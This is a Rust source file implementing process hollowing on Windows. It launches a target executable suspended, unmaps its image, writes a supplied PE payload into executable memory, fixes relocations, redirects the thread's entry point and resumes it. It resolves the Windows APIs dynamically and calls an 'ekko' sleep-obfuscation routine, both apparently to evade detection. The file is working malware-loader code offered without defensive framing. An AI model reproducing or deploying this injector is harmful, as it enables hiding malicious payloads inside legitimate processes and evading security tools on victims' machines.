

use anyhow::*;
use winapi::um::{
    processthreadsapi::{
        PROCESS_INFORMATION,
        STARTUPINFOA,
    },
    winnt::{
        CONTEXT
    },
};
use windows_sys::Win32::Foundation::HINSTANCE;
use core::{ffi::c_void, ptr::null_mut, mem::{transmute, size_of}};
use windows_sys::{core::PCSTR};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,};
use windows_sys::Wdk::System::Threading::{PROCESSINFOCLASS};
use windows_sys::Win32::System::Threading::{PROCESS_BASIC_INFORMATION};
use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,CONTEXT_ALL_X86};
use  windows_sys::Win32::System::SystemServices::{IMAGE_REL_BASED_HIGHLOW,IMAGE_REL_BASED_DIR64, IMAGE_BASE_RELOCATION};
use log::{debug, error, info, warn};

use super::ekko::ekko;

pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
     

    #[cfg(debug_assertions)]
    {
        // morf function
        let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
        let sleep_time = 2200;
        ekko(sleep_time, &mut  key_buf);
    }
    unsafe{ 
      
        #[allow(non_camel_case_types)]
        type fnCreateProcessA = unsafe extern "system" fn(
            lpApplicationName: PCSTR,
            lpCommandLine: PCSTR,
            lpProcessAttributes: *mut c_void,
            lpThreadAttributes: *mut c_void,
            bInheritHandles: i32,
            dwCreationFlags: u32,
            lpEnvironment: *mut c_void,
            lpCurrentDirectory: PCSTR,
            lpStartupInfo: *mut STARTUPINFOA,
            lpProcessInformation: *mut PROCESS_INFORMATION
        ) -> HINSTANCE;
        let mut CreateProcessA = transmute::<_, fnCreateProcessA>(0x00000 as  usize); //dummy assignation
    
        #[allow(non_camel_case_types)]
        type fnNtQueryInformationProcess = unsafe extern "system" fn(
            ProcessHandle: HINSTANCE,
            ProcessInformationClass: PROCESSINFOCLASS,
            ProcessInformation: *mut c_void,
            ProcessInformationLength: u32,
            ReturnLength: *mut i32
        ) -> HINSTANCE;
        let mut NtQueryInformationProcess = transmute::<_, fnNtQueryInformationProcess>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnReadProcessMemory = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpBaseAddress: *mut c_void,
            lpBuffer: *mut c_void,
            nSize: usize,
            lpNumberOfBytesRead: *mut usize
        ) -> HINSTANCE;
        let mut ReadProcessMemory = transmute::<_, fnReadProcessMemory>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnNtUnmapViewOfSection = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpBaseAddress: *mut c_void
        ) -> HINSTANCE;
        let mut NtUnmapViewOfSection = transmute::<_, fnNtUnmapViewOfSection>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnVirtualAlloc = unsafe extern "system" fn(
            lpaddress: *const c_void, 
            dwsize: usize, 
            flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
            flprotect: PAGE_PROTECTION_FLAGS
        ) -> *mut c_void;
        let mut VirtualAlloc = transmute::<_, fnVirtualAlloc>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnVirtualAllocEx = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpaddress: *const c_void, 
            dwsize: usize, 
            flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
            flprotect: PAGE_PROTECTION_FLAGS
        ) -> *mut c_void;
        let mut VirtualAllocEx = transmute::<_, fnVirtualAllocEx>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnWriteProcessMemory = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpaddress: *const c_void, 
            lpBuffer: *const c_void, 
            nsize: usize, 
            lpNumberOfBytesWritten: *mut usize
        ) -> *mut c_void;
        let mut WriteProcessMemory = transmute::<_, fnWriteProcessMemory>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnGetThreadContext = unsafe extern "system" fn(
            hThread: HINSTANCE,
            lpContext: *mut CONTEXT
        ) -> *mut c_void;
        let mut GetThreadContext = transmute::<_, fnGetThreadContext>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnSetThreadContext = unsafe extern "system" fn(
            hThread: HINSTANCE,
            lpContext: *mut CONTEXT
        ) -> *mut c_void;
        let mut SetThreadContext = transmute::<_, fnSetThreadContext>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnResumeThread = unsafe extern "system" fn(
            hThread: HINSTANCE
        ) -> *mut c_void;
        let mut ResumeThread = transmute::<_, fnResumeThread>(0x00000 as  usize); //dummy assignation
        
    
        let module_name = "KERNEL32.dll\0" ;  
        let kernel32_handle:usize = GetModuleHandleA(module_name.as_ptr() as *const u8) as usize;

        if kernel32_handle == 0 {
           
        } else {
           
        }


        let module_name = "ntdll.dll\0" ;  
        let ntdll_handle:usize = GetModuleHandleA(module_name.as_ptr() as *const u8) as usize;

        if ntdll_handle == 0 {
           
        } else {
          
        }
    
     
        let mut function_name: &str = "CreateProcessA\0" ; 
        let mut CreateProcessA_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        CreateProcessA = transmute::<_, fnCreateProcessA>(CreateProcessA_p);

       
        let mut function_name: &str = "NtQueryInformationProcess\0" ; 
        let mut NtQueryInformationProcess_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        NtQueryInformationProcess = transmute::<_, fnNtQueryInformationProcess>(NtQueryInformationProcess_p);

  
        let mut function_name: &str = "ReadProcessMemory\0" ; 
        let mut ReadProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
      
        ReadProcessMemory = transmute::<_, fnReadProcessMemory>(ReadProcessMemory_p);

        let mut function_name: &str = "NtUnmapViewOfSection\0" ; 
        let mut NtUnmapViewOfSection_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
       
        NtUnmapViewOfSection = transmute::<_, fnNtUnmapViewOfSection>(NtUnmapViewOfSection_p);

      
        let mut function_name: &str = "VirtualAlloc\0" ; 
        let mut VirtualAlloc_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
       

 
        let mut function_name: &str = "VirtualAllocEx\0" ; 
        let mut VirtualAllocEx_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        
        VirtualAllocEx = transmute::<_, fnVirtualAllocEx>(VirtualAllocEx_p);

      
        let mut function_name: &str = "WriteProcessMemory\0" ;
        let mut WriteProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
     
        WriteProcessMemory = transmute::<_, fnWriteProcessMemory>(WriteProcessMemory_p);

 
        let mut function_name: &str = "GetThreadContext\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut GetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
     
        GetThreadContext = transmute::<_, fnGetThreadContext>(GetThreadContext_p);

     
        let mut function_name: &str = "SetThreadContext\0" ; 
        let mut SetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
       
        SetThreadContext = transmute::<_, fnSetThreadContext>(SetThreadContext_p);

        let mut function_name: &str = "ResumeThread\0" ; 
        let mut ResumeThread_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
      
        ResumeThread = transmute::<_, fnResumeThread>(ResumeThread_p);

      
        let pe_to_execute = dest.trim().to_owned() + "\0"; 

        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
        let mut lp_process_information: PROCESS_INFORMATION = std::mem::zeroed();
        CreateProcessA(
            null_mut(),
            pe_to_execute.as_ptr() as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x00000004,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut lp_startup_info as *mut STARTUPINFOA,
            &mut lp_process_information as *mut PROCESS_INFORMATION,
        );
        let mut startup = lp_startup_info;
        let mut process_info =  lp_process_information;
        
       

        let hp = lp_process_information.hProcess;

        let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let process_information_class = PROCESSINFOCLASS::default();
        let mut return_l = 0;
       
        NtQueryInformationProcess(
            lp_process_information.hProcess as isize, //ProcessHandle
            process_information_class, //ProcessInformationClass
            &mut process_information as *mut _ as *mut c_void, //ProcessInformation
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32, //ProcessInformationLength
            &mut return_l, //ReturnLength
        );
        let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
        let mut image_base_buffer = [0; std::mem::size_of::<&u8>()]; 
        ReadProcessMemory(
            lp_process_information.hProcess as isize, //hProcess
            peb_image_offset as *mut c_void, //lpBaseAddress
            image_base_buffer.as_mut_ptr() as *mut c_void, //lpBuffer
            image_base_buffer.len(), //nSize
            std::ptr::null_mut(), //*lpNumberOfBytesRead
        );
    
        let remote_pe_base_address_original =usize::from_ne_bytes(image_base_buffer) ;
    

        let mut dest_image_base_address: *mut c_void = remote_pe_base_address_original as *mut c_void;
        
    
        NtUnmapViewOfSection(
            lp_process_information.hProcess as isize,
            remote_pe_base_address_original as *mut c_void
        );

   
        let pe_to_inject_base_addr = buf.as_mut_ptr() as *mut c_void;
        let loaded_module_base = pe_to_inject_base_addr;
        let dos_header: *mut IMAGE_DOS_HEADER = loaded_module_base as *mut IMAGE_DOS_HEADER;

     
        let module_dos_headers: *mut IMAGE_DOS_HEADER = pe_to_inject_base_addr as *mut IMAGE_DOS_HEADER;
        let module_nt_headers_ptr = pe_to_inject_base_addr as usize + (*module_dos_headers).e_lfanew as  usize;
        let module_nt_headers: *mut IMAGE_NT_HEADERS64 = module_nt_headers_ptr as *mut IMAGE_NT_HEADERS64; 
        
        #[cfg(debug_assertions)]
        {
            // morf function
            let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
            let sleep_time = 2200;
            ekko(sleep_time, &mut  key_buf);
        }
        let pe_to_inject_size = (*module_nt_headers).OptionalHeader.SizeOfImage;
        
        
       
        let mut old_source_image_base_address = (*module_nt_headers).OptionalHeader.ImageBase as u64;

    
        let mut allocated_memory_addr = VirtualAllocEx(
            lp_process_information.hProcess as isize, //hProcess
            remote_pe_base_address_original as *mut c_void,//lpaddress
            pe_to_inject_size as usize,//dwsize
            MEM_COMMIT | MEM_RESERVE,//flallocationtype
            PAGE_EXECUTE_READWRITE//flprotect
        );
        let mut new_dest_image_base_address : *mut c_void = allocated_memory_addr;
    
        if new_dest_image_base_address as u64 == 0x0 as u64 {
         
         
        };

    
        (*module_nt_headers).OptionalHeader.ImageBase = new_dest_image_base_address as u64; 
       
  
        let sizeofheaders = (*module_nt_headers).OptionalHeader.SizeOfHeaders;
      
        WriteProcessMemory(
            lp_process_information.hProcess as isize,//hProcess
            new_dest_image_base_address as *mut c_void,//lpaddress 
            loaded_module_base,//lpBuffer 
            sizeofheaders as usize,//nsize
            std::ptr::null_mut(), 
        );

 

 
        let optional_headers_ptr = &(*module_nt_headers).OptionalHeader as *const _ as usize;
        let mut first_section: *mut c_void = (optional_headers_ptr as  usize + (*module_nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut c_void;

       
        let mut number_of_sections =  (*module_nt_headers).FileHeader.NumberOfSections;

        while number_of_sections > 0 {
            
            let mut section_headers: *mut IMAGE_SECTION_HEADER = first_section as *mut IMAGE_SECTION_HEADER; 
            let mut section_RVA = (*section_headers).VirtualAddress;

            
            
            let mut new_section_VA = (new_dest_image_base_address as *mut u8).add(section_RVA as usize);
            #[cfg(debug_assertions)]
            {
                // morf function
                let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
                let sleep_time = 2200;
                ekko(sleep_time, &mut  key_buf);
            }
        
            let mut section_data = (loaded_module_base as usize + (*section_headers).PointerToRawData as usize) as *mut usize;
           
            let mut section_data_size = (*section_headers).SizeOfRawData;
                       
            
            WriteProcessMemory(
                lp_process_information.hProcess as isize,//hProcess
                new_section_VA as *mut c_void,//lpaddress 
                section_data as *mut c_void,//lpBuffer 
                section_data_size as usize,//nsize
                std::ptr::null_mut(), //*lpNumberOfBytesRead
            );

         
            let IMAGE_SECTION_HEADER_size = core::mem::size_of::<IMAGE_SECTION_HEADER>(); // usually 40 bytes
          
            first_section = (first_section as *mut u8).add(40) as *mut c_void;
            
            number_of_sections -= 1;
        }

   

        let base_address_delta = (new_dest_image_base_address  as isize - old_source_image_base_address as isize);

     
        let mut relocation_directory =  (*module_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

    
        if relocation_directory.Size != 0 {

       
            let relocation_directory_ptr = &mut relocation_directory as *mut _;
            let relocation_directory_IMAGE_DATA_DIRECTORY : *mut IMAGE_DATA_DIRECTORY = relocation_directory_ptr as *mut IMAGE_DATA_DIRECTORY; 
            let mut first_entry_va =  (new_dest_image_base_address as *mut u8).add(((*relocation_directory_IMAGE_DATA_DIRECTORY).VirtualAddress) as usize);

            let reloc_size = (*relocation_directory_IMAGE_DATA_DIRECTORY).Size;

             let mut reloc_table_buf = vec![0; reloc_size as usize]; 
            ReadProcessMemory(
                lp_process_information.hProcess as isize,//hProcess
                first_entry_va as *mut c_void,//lpBaseAddress
                reloc_table_buf.as_mut_ptr() as *mut c_void,//lpBuffer
                (*relocation_directory_IMAGE_DATA_DIRECTORY).Size as usize,//nSize
                std::ptr::null_mut()//lpNumberOfBytesRead
            );
            let first_entry_vad = reloc_table_buf.as_mut_ptr() as *mut usize;
           
            let mut first_entry_va = reloc_table_buf.as_mut_ptr() as *mut c_void;

    
            let mut first_entry_IMAGE_BASE_RELOC = first_entry_va as *mut IMAGE_BASE_RELOCATION;
         
            let mut first_entry_IMAGE_BASE_RELOC_size_block = (*first_entry_IMAGE_BASE_RELOC).SizeOfBlock;
            let mut count = 0;
            while (first_entry_IMAGE_BASE_RELOC_size_block != 0) {
              
                let relocation_block_VA = new_dest_image_base_address  as usize +  (*first_entry_IMAGE_BASE_RELOC).VirtualAddress as usize;
                let mut entries_number = ((*first_entry_IMAGE_BASE_RELOC).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>() ;
                let first_entry_in_block: *const u16 = first_entry_va.add(size_of::<IMAGE_BASE_RELOCATION>()) as *const u16; // IMAGE_BASE_RELOCATION size should be 8
                
              
                for i in 0..entries_number {

                 
                    let type_field: u32 = (first_entry_in_block.offset(i as isize).read() >> 12) as u32;
                    let offset = first_entry_in_block.offset(i as isize).read() & 0xFFF;
                    if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW {
                       
                        let mut original_address: u64 = 0;  
                        let ogaddress = ReadProcessMemory(
                            lp_process_information.hProcess as isize,//hProcess
                            (relocation_block_VA  +  offset as usize) as *mut c_void, 
                            &mut original_address as *mut _ as *mut c_void,//lpBuffer
                            std::mem::size_of::<u64>(),//nSize
                            std::ptr::null_mut()//lpNumberOfBytesRead
                        );
                        
                        let fixedaddress = (original_address as isize + base_address_delta as isize) as isize;

                     
                        WriteProcessMemory(
                            lp_process_information.hProcess as isize,//hProcess
                            (relocation_block_VA + offset as usize) as *mut c_void,//lpaddress 
                            &fixedaddress as *const _ as *const c_void,//lpBuffer 
                            std::mem::size_of::<u64>(),//nsize
                            std::ptr::null_mut(), 
                        );
                    }
                }

              
                first_entry_va = first_entry_va.add(first_entry_IMAGE_BASE_RELOC_size_block as usize);
                first_entry_IMAGE_BASE_RELOC = first_entry_va as *mut IMAGE_BASE_RELOCATION;
                first_entry_IMAGE_BASE_RELOC_size_block = (*first_entry_IMAGE_BASE_RELOC).SizeOfBlock;
                count += 1;
            }
        }

     
        if new_dest_image_base_address as *mut winapi::ctypes::c_void != dest_image_base_address as *mut winapi::ctypes::c_void  {
            WriteProcessMemory(
                hp as isize,
                (dest_image_base_address as u64 + 0x10) as _,
                new_dest_image_base_address,
                std::mem::size_of::<*mut c_void>(),
                null_mut(),
            );
        }

      #[cfg(debug_assertions)]
    {
        // morf function
        let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
        let sleep_time = 2200;
        ekko(sleep_time, &mut  key_buf);
    }
        #[repr(align(16))]
        struct AlignedContext {
            context: CONTEXT,
        }
        let mut ctx: AlignedContext = unsafe { std::mem::zeroed() };
        ctx.context.ContextFlags = CONTEXT_ALL_X86;

        let entry_point = new_dest_image_base_address as u64 + (*module_nt_headers).OptionalHeader.AddressOfEntryPoint as u64;

     
        if GetThreadContext(
            lp_process_information.hThread as isize, 
            &mut ctx.context) 
        == std::ptr::null_mut() {
            
        }

      
        ctx.context.Rcx = entry_point;
        if SetThreadContext(lp_process_information.hThread as isize, &mut ctx.context) == std::ptr::null_mut() {
            
        }

        if ResumeThread(lp_process_information.hThread as isize) == std::ptr::null_mut() {
          
        }
 
        info!("Process hollowing done");

        Ok(())
    }
}
pub fn step(){
    println!("Press Enter to continue...");
    use std::io;
    use std::io::prelude::*;
   
    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Failed to read line");
}


#[repr(C)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,    // Magic number
    pub e_cblp: u16,     // Bytes on last page of file
    pub e_cp: u16,       // Pages in file
    pub e_crlc: u16,     // Relocations
    pub e_cparhdr: u16,  // Size of header in paragraphs
    pub e_minalloc: u16, // Minimum extra paragraphs needed
    pub e_maxalloc: u16, // Maximum extra paragraphs needed
    pub e_ss: u16,       // Initial (relative) SS value
    pub e_sp: u16,       // Initial SP value
    pub e_csum: u16,     // Checksum
    pub e_ip: u16,       // Initial IP value
    pub e_cs: u16,       // Initial (relative) CS value
    pub e_lfarlc: u16,   // File address of relocation table
    pub e_ovno: u16,     // Overlay number
    pub e_res: [u16; 4], // Reserved words
    pub e_oemid: u16,    // OEM identifier (for e_oeminfo)
    pub e_oeminfo: u16,  // OEM information; e_oemid specific
    pub e_res2: [u16; 10], // Reserved words
    pub e_lfanew: i32,   // File address of new exe header
}
